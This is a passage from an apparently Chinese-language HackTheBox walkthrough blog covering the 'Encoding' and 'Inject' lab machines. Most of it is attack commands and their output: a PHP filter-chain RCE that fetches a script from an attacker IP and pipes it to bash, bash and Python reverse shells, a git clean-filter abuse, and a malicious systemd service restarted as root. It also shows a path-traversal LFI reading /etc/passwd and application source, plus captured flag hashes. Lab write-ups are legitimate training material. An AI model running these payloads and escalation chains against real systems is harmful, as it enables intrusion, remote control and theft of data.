class="line">tcpdump:x:109:115::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tss:x:110:116:TPM software stack,,,:&#x2F;var&#x2F;lib&#x2F;tpm:&#x2F;bin&#x2F;false</span><br><span class="line">landscape:x:111:117::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">usbmux:x:112:46:usbmux daemon,,,:&#x2F;var&#x2F;lib&#x2F;usbmux:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">svc:x:1000:1000:svc:&#x2F;home&#x2F;svc:&#x2F;bin&#x2F;bash</span><br><span class="line">lxd:x:999:100::&#x2F;var&#x2F;snap&#x2F;lxd&#x2F;common&#x2F;lxd:&#x2F;bin&#x2F;false</span><br><span class="line">fwupd-refresh:x:113:120:fwupd-refresh user,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_laurel:x:998:998::&#x2F;var&#x2F;log&#x2F;laurel:&#x2F;bin&#x2F;false</span><br></pre></td></tr></table></figure><p>使用<code>php_filter_chain_generator</code>生成PAYLOAD并进行RCE</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/synacktiv/php_filter_chain_generator</span><br><span class="line">python php_filter_chain_generator.py --chain <span class="string">&#x27;&lt;?php system(&quot;curl http://10.10.*.*/bfl.sh | bash&quot;);?&gt;     &#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/10.10.16.2/9998 0&gt;&amp;1&#x27;</span> &gt; /tmp/bfl.sh</span><br><span class="line"><span class="built_in">cd</span> /tmp/ &amp;&amp; python -m http.server 80 &amp;</span><br><span class="line">python exp.py PAYLOAD</span><br></pre></td></tr></table></figure><p>获取反弹Shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for www-data on encoding:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on encoding:</span><br><span class="line">    (svc) NOPASSWD: &#x2F;var&#x2F;www&#x2F;image&#x2F;scripts&#x2F;git-commit.sh</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/www/image/scripts/git-commit.sh</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">u=$(/usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image ls-files  -o --exclude-standard)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ <span class="variable">$u</span> ]]; <span class="keyword">then</span></span><br><span class="line">        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image add -A</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image commit -m <span class="string">&quot;Commited from API!&quot;</span> --author=<span class="string">&quot;james &lt;james@haxtables.htb&gt;&quot;</span>  --no-verify</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;python3 -c \&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;0.0.0.0&#x27;,9995));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);\&quot;&quot;</span> &gt; /tmp/BFL</span><br><span class="line">chmod +x /tmp/BFL</span><br><span class="line">git init</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;*.php filter=indent&#x27;</span> &gt; /var/www/image/.git/info/attributes</span><br><span class="line">git config filter.indent.clean /tmp/BFL</span><br><span class="line">sudo -u svc /var/www/image/scripts/git-commit.sh</span><br></pre></td></tr></table></figure><blockquote><p>Git提供了一种过滤机制，允许用户在文件检出或提交到Git存储库时将自定义脚本应用于文件。<br />过滤机制由两种类型的过滤器组成：clean过滤器和smudge过滤器。clean过滤器用于在将文件提交到Git存储库之前转换文件的内容。smudge过滤器用于在从Git存储库检出文件时转换文件的内容。<br />在这种情况下，攻击者创建了一个clean过滤器，该过滤器执行一个Python脚本，该脚本打开一个反向shell到指定的IP地址和端口。攻击者已将Git配置为对/var/www/image目录中的所有PHP文件使用此clean过滤器。这意味着每当该目录中的PHP文件提交到Git存储库时，将应用clean过滤器，并执行Python脚本。<br />Generated By ChatGPT</p></blockquote><p>这个地方反弹Shell不能弹到本机<br />疑似是网络问题，不能通过VPN的网络接口接收python reverse shell<br />只能在靶机上再开个shell然后nc监听</p><p>查看<code>user.txt</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/svc/user.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">46b119076b33b6baadfb2467e0128703</span><br></pre></td></tr></table></figure><h2 id="权限提升-26"><a class="markdownIt-Anchor" href="#权限提升-26"></a> 权限提升</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for svc on encoding:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User svc may run the following commands on encoding:</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;systemctl restart *</span><br></pre></td></tr></table></figure><p>查看路径权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getfacl /etc/systemd/system</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># file: etc&#x2F;systemd&#x2F;system</span><br><span class="line"># owner: root</span><br><span class="line"># group: root</span><br><span class="line">user::rwx</span><br><span class="line">user:svc:-wx</span><br><span class="line">group::rwx</span><br><span class="line">mask::rwx</span><br><span class="line">other::r-x</span><br></pre></td></tr></table></figure><p>编写service如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[Service]</span><br><span class="line">ExecStart&#x3D;&#x2F;bin&#x2F;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.*.*&#x2F;9996 0&gt;&amp;1&quot;</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy&#x3D;multi-user.target</span><br></pre></td></tr></table></figure><p>监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9996</span><br></pre></td></tr></table></figure><p>写入service</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="variable">$PYTHON_REVERSE_SHELL_PAYLOAD_BASE64_ENCODED</span> | base64 -d &gt; /etc/systemd/system/bufferfly.service</span><br></pre></td></tr></table></figure><p>重启service</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root /usr/bin/systemctl restart bufferfly</span><br></pre></td></tr></table></figure><p>获取Shell，查看root.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffba7f2f7e12fd7fa94a522e00db275e</span><br></pre></td></tr></table></figure><hr /><h1 id="hackthebox_inject"><a class="markdownIt-Anchor" href="#hackthebox_inject"></a> HackTheBox_Inject</h1><h2 id="信息收集-11"><a class="markdownIt-Anchor" href="#信息收集-11"></a> 信息收集</h2><h3 id="端口扫描-28"><a class="markdownIt-Anchor" href="#端口扫描-28"></a> 端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -T5 -v 10.10.11.204</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.204</span><br><span class="line">Host is up (2.3s latency).</span><br><span class="line">Not shown: 613 filtered ports, 385 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22&#x2F;tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">8080&#x2F;tcp open  nagios-nsca Nagios NSCA</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-26"><a class="markdownIt-Anchor" href="#漏洞利用-26"></a> 漏洞利用</h2><p>请求<code>http://10.10.11.204:8080/upload</code></p><p>上传文件后通过以下方法下载文件</p><p><code>http://10.10.11.204:8080/show_image?img=FILENAME</code></p><p>LFI</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.11.204:8080/show_image?img=../../../../../../etc/passwd</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:102:104:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">messagebus:x:103:106::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">syslog:x:104:110::&#x2F;home&#x2F;syslog:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:105:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tss:x:106:111:TPM software stack,,,:&#x2F;var&#x2F;lib&#x2F;tpm:&#x2F;bin&#x2F;false</span><br><span class="line">uuidd:x:107:112::&#x2F;run&#x2F;uuidd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tcpdump:x:108:113::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">landscape:x:109:115::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">pollinate:x:110:1::&#x2F;var&#x2F;cache&#x2F;pollinate:&#x2F;bin&#x2F;false</span><br><span class="line">usbmux:x:111:46:usbmux daemon,,,:&#x2F;var&#x2F;lib&#x2F;usbmux:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">frank:x:1000:1000:frank:&#x2F;home&#x2F;frank:&#x2F;bin&#x2F;bash</span><br><span class="line">lxd:x:998:100::&#x2F;var&#x2F;snap&#x2F;lxd&#x2F;common&#x2F;lxd:&#x2F;bin&#x2F;false</span><br><span class="line">sshd:x:113:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">phil:x:1001:1001::&#x2F;home&#x2F;phil:&#x2F;bin&#x2F;bash</span><br><span class="line">fwupd-refresh:x:112:118:fwupd-refresh user,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_laurel:x:997:996::&#x2F;var&#x2F;log&#x2F;laurel:&#x2F;bin&#x2F;false</span><br></pre></td></tr></table></figure><p>可以列目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.11.204:8080/show_image?img=../../../../../../</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">libx32</span><br><span class="line">lost+found</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br></pre></td></tr></table></figure><p>WEB代码如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.11.204:8080/show_image?img=../../../../../../var/www/WebApp/src/main/java/com/example/WebApp/user/UserController.java</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.WebApp.user;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.Resource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.UrlResource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.Model;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.multipart.MultipartFile;</span><br><span class="line"><span class="keyword">import</span> javax.activation.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.StandardCopyOption;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String UPLOADED_FOLDER = <span class="string">&quot;/var/www/WebApp/src/main/uploads/&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">homePage</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;homepage&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/register&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">signUpFormGET</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;under&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/upload&quot;, method = RequestMethod.GET)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">UploadFormGet</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;upload&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/show_image&quot;, method = RequestMethod.GET)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ResponseEntity <span class="title">getImage</span><span class="params">(<span class="meta">@RequestParam(&quot;img&quot;)</span> String name)</span> </span>&#123;</span><br><span class="line">        String fileName = UPLOADED_FOLDER + name;</span><br><span class="line">        Path path = Paths.get(fileName);</span><br><span class="line">        Resource resource = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            resource = <span class="keyword">new</span> UrlResource(path.toUri());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (MalformedURLException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.ok().contentType(MediaType.IMAGE_JPEG).body(resource);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/upload&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">Upload</span><span class="params">(<span class="meta">@RequestParam(&quot;file&quot;)</span> MultipartFile file, Model model)</span></span>&#123;</span><br><span class="line">        String fileName = StringUtils.cleanPath(file.getOriginalFilename());</span><br><span class="line">        <span class="keyword">if</span> (!file.isEmpty() &amp;&amp; !fileName.contains(<span class="string">&quot;/&quot;</span>))&#123;</span><br><span class="line">            String mimetype = <span class="keyword">new</span> MimetypesFileTypeMap().getContentType(fileName);</span><br><span class="line">            String type = mimetype.split(<span class="string">&quot;/&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">if</span> (type.equals(<span class="string">&quot;image&quot;</span>))&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Path path = Paths.get(UPLOADED_FOLDER+fileName);</span><br><span class="line">                    Files.copy(file.getInputStream(),path, StandardCopyOption.REPLACE_EXISTING);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                model.addAttribute(<span class="string">&quot;name&quot;</span>, fileName);</span><br><span class="line">                model.addAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;Uploaded!&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                model.addAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;Only image files are accepted!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            model.addAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;Please Upload a file!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;upload&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/release_notes&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">changelog</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;change&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/blogs&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">blogPage</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;blog&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看<code>pom.xml</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.11.204:8080/show_image?img=../../../../../../var/www/WebApp/pom.xml</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span 